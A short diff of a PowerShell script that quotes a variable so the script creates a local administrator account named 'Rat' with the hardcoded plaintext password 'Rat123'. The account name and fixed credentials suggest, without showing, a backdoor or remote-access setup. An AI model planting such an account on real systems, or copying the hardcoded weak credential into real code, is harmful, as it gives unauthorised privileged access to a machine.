@@ -25,7 +25,7 @@ function Create-NewLocalAdmin {
     }
 }
 # create admin user
-$NewLocalAdmin = Rat
+$NewLocalAdmin = "Rat"
 $Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
